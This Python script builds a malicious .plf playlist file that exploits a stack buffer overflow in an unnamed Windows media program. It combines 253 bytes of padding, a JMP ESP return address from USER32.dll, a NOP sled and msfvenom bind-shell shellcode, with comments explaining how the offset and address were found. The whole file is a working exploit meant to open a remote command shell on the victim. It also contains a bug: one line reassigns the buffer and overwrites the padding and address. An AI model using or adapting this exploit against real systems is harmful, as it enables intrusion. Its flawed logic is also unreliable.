#!/usr/bin/python

file = open("exploit.plf", "wb")

buffer = "http://"

# /usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb -q 69413469
# [*] Exact match at offset 253
# /usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb -q 41316a41
# [*] Exact match at offset 273

buffer += "A" * 253

"""
Run the program
View -> Executable Modules -> USER32.dll
Search for -> Command -> JMP ESP -> Note the address
Replace BBBB with the address
This address will jump back to where the shellcode is located
"""

buffer += "\x53\x93\x42\x7e"

buffer = "\x90" * 48

# msfvenom -p windows/shell_bind_tcp -f c -a x86 -b "\x00\x0a\x1a"
buffer += ("\xbd\x8b\xde\x07\x11\xda\xcc\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x53\x83\xc2\x04\x31\x6a\x0e\x03\xe1\xd0\xe5\xe4\x09\x04\x6b"
"\x06\xf1\xd5\x0c\x8e\x14\xe4\x0c\xf4\x5d\x57\xbd\x7e\x33\x54"
"\x36\xd2\xa7\xef\x3a\xfb\xc8\x58\xf0\xdd\xe7\x59\xa9\x1e\x66"
"\xda\xb0\x72\x48\xe3\x7a\x87\x89\x24\x66\x6a\xdb\xfd\xec\xd9"
"\xcb\x8a\xb9\xe1\x60\xc0\x2c\x62\x95\x91\x4f\x43\x08\xa9\x09"
"\x43\xab\x7e\x22\xca\xb3\x63\x0f\x84\x48\x57\xfb\x17\x98\xa9"
"\x04\xbb\xe5\x05\xf7\xc5\x22\xa1\xe8\xb3\x5a\xd1\x95\xc3\x99"
"\xab\x41\x41\x39\x0b\x01\xf1\xe5\xad\xc6\x64\x6e\xa1\xa3\xe3"
"\x28\xa6\x32\x27\x43\xd2\xbf\xc6\x83\x52\xfb\xec\x07\x3e\x5f"
"\x8c\x1e\x9a\x0e\xb1\x40\x45\xee\x17\x0b\x68\xfb\x25\x56\xe5"
"\xc8\x07\x68\xf5\x46\x1f\x1b\xc7\xc9\x8b\xb3\x6b\x81\x15\x44"
"\x8b\xb8\xe2\xda\x72\x43\x13\xf3\xb0\x17\x43\x6b\x10\x18\x08"
"\x6b\x9d\xcd\xa5\x63\x38\xbe\xdb\x8e\xfa\x6e\x5c\x20\x93\x64"
"\x53\x1f\x83\x86\xb9\x08\x2c\x7b\x42\x27\xf1\xf2\xa4\x2d\x19"
"\x53\x7e\xd9\xdb\x80\xb7\x7e\x23\xe3\xef\xe8\x6c\xe5\x28\x17"
"\x6d\x23\x1f\x8f\xe6\x20\x9b\xae\xf8\x6c\x8b\xa7\x6f\xfa\x5a"
"\x8a\x0e\xfb\x76\x7c\xb2\x6e\x1d\x7c\xbd\x92\x8a\x2b\xea\x65"
"\xc3\xb9\x06\xdf\x7d\xdf\xda\xb9\x46\x5b\x01\x7a\x48\x62\xc4"
"\xc6\x6e\x74\x10\xc6\x2a\x20\xcc\x91\xe4\x9e\xaa\x4b\x47\x48"
"\x65\x27\x01\x1c\xf0\x0b\x92\x5a\xfd\x41\x64\x82\x4c\x3c\x31"
"\xbd\x61\xa8\xb5\xc6\x9f\x48\x39\x1d\x24\x78\x70\x3f\x0d\x11"
"\xdd\xaa\x0f\x7c\xde\x01\x53\x79\x5d\xa3\x2c\x7e\x7d\xc6\x29"
"\x3a\x39\x3b\x40\x53\xac\x3b\xf7\x54\xe5")

buffer += "C" * 50

file.write(buffer)

file.close()
